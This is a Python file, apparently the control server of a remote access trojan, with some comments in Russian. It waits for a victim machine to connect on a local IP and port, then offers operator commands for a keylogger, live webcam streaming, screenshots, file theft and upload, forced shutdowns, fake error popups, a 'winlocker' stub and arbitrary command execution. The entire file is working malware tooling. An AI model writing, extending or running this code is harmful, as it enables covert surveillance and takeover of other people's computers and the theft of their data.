import threading
import socket
import pickle
import socket
import struct
import cv2
import os

print("Это программа находится в beta режиме! Не многие вункции работают корректно!")
def StartServer(ip,port):
	s.bind((ip,port))
	s.listen(1)
	print("Waiting for connection...")
	global connection, address
	connection, address = s.accept()
	system = connection.recv(2048).decode()
	print("Connection from " + str(address) + "[" + system + "]")
	while True:
		StartFunction()

def SaveCamera():
	data = b""
	payload_size = struct.calcsize("L")
	while True:
		while len(data) < payload_size:
			data += connection.recv(4096)
		packed_msg_size = data[:payload_size]
		data = data[payload_size:]
		msg_size = struct.unpack("L", packed_msg_size)[0]
		try:
			while len(data) < msg_size:
				data += connection.recv(4096)
			frame_data = data[:msg_size]
			data = data[msg_size:]
			frame = pickle.loads(frame_data)
			cv2.imshow("frame", frame)
			cv2.waitKey(1)
		except:
			break

def StartFunction():
	toSend = input("--> ")
	if len(toSend) == 0:
		return
	elif toSend == "func: winlocker":
		print(" ")
	elif toSend == "func: keyslogger":
		connection.send("func: keyslogger".encode())
	elif toSend == "func: open_site:":
		connection.send(input("site: ").encode())
	elif toSend == "func: sh_off":
		connection.send("shutdown -a".encode())
		print(" ")
	elif toSend == "func: sh_fake":
		connection.send("sh_fake".encode())
		print(" ")
	elif toSend == "func: say:":
		connection.send(input("    say:").encode())
		print(" ")
	elif toSend == "func: play_music:":
		connection.send(input("    play_music").encode())
		print(" ")
	elif toSend == "'s":
		connection.send(toSend.encode())
		print(" ")
	elif toSend == "func: cam":
		connection.send("func: cam".encode())
		threading.Thread(target=SaveCamera).start()
	elif toSend == "func: sh_on:":
		sgsec = input("    shsec: ")
		shu = "shutdown -s -t " + sgsec
		connection.send(shu.encode())
	elif toSend == "func: open:":
		connection.send(input("    open:").encode())
		data = connection.recv(2048).decode()
		print(data)
	elif toSend == "func: error:":
		inf = input("    s: ")
		inf2 = input("    d: ")
		connection.send(inf.encode())
		connection.send(inf2.encode())
	elif toSend == "func: paste:":
		hg = input("s: ")
		connection.send(hg.encode())
		file = open(hg, "rb")
		image_data = file.read(2048)
		while image_data:
			connection.send(image_data)
			image_data = file.read(2048)
		file.close()
	elif toSend == "func: save:":
		connection.send("func: save:".encode())
		toSend2 = input("    save: ")
		connection.send(toSend2.encode())
		file = open(toSend2, "wb")
		image_chunk = connection.recv(4048)
		while image_chunk:
			file.write(image_chunk)
			image_chunk = connection.recv(4048)
			print(image_chunk)
		file.close()
	elif toSend == "func: screenshot":
		print(" ")
		cdm = os.getcwd()
		os.chdir("screenshot")
		file = open("screenshot.png", "wb")
		image_chunk = connection.recv(2048)
		while image_chunk:
			file.write(image_chunk)
			image_chunk = connection.recv(2048)
		file.close()
		os.chdir(cdm)
		while True:
			s = connection.recv(2048).decode()
			print(s)
	else:
		try:
			connection.send(toSend.encode())
			print(connection.recv(2048).decode())
		except:
			SaveCamera()

if __name__ == '__main__':
	s = socket.socket()
	while True:
		StartServer("192.168.0.113", 6201)
